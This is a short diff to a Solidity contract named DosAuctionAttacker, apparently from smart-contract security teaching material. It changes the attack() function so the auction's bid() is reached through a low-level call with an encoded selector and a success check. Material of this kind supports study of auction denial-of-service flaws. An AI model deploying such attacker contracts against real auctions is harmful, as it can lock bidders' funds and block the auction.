@@ -14,6 +14,9 @@ contract DosAuctionAttacker {
     }
 
     function attack() external payable {
-        auction.bid.value(msg.value)();
+        bytes memory data = abi.encodeWithSelector(bytes4(keccak256("bid()")));
+
+        (bool success, ) = auction.call.value(msg.value)(data);
+        require(success, "Attack failed");
     }
 }
